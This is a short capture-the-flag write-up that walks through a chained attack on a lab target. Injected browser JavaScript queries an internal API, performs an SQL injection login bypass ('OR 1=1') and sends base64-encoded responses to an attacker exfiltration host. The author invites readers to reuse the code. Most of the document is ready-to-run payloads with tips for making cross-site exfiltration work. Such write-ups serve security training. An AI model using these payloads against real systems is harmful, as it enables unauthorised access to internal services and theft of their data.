This is just an exaple taken from a CTF but feel free to take part of the code or inspiration. More specifically we found that we could read the **admin.php** that had traces about a internal api site, from there we could perform a manual SQLi and dump the DB from the backside.

1)Read the code of **/admin.php**
```
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

2)From step 1 we found in the code traces about an internal API (OBS: you may add or remove `xhr.withCredentials = true;` based if the backend allow credentials or not in Crosssite request, you will notice if fails then you won't be able to exfiltrate)
```
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```
3)From step 2 we can identify the logic of the login
```
        <form action="/check" method="post">

            <div class="container">
                <label for="uname"><b>Username</b></label>
                <input type="text" placeholder="Enter Username" name="uname" required>

                <label for="psw"><b>Password</b></label>
                <input type="password" placeholder="Enter Password" name="pass" required>

                <button type="submit">Login</button>
                <label>
                    <input type="checkbox" checked="checked" name="remember"> Remember me

```
4)From step 3 we identified that a POST request is made to http://internal.vulnerablesite.htb/check with parameters `uname=USERNAME&pass=PASSWORD`
5)Here we could form our payload to bypass the login and get the SQL
```
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```
6)From here just take it further and increase the query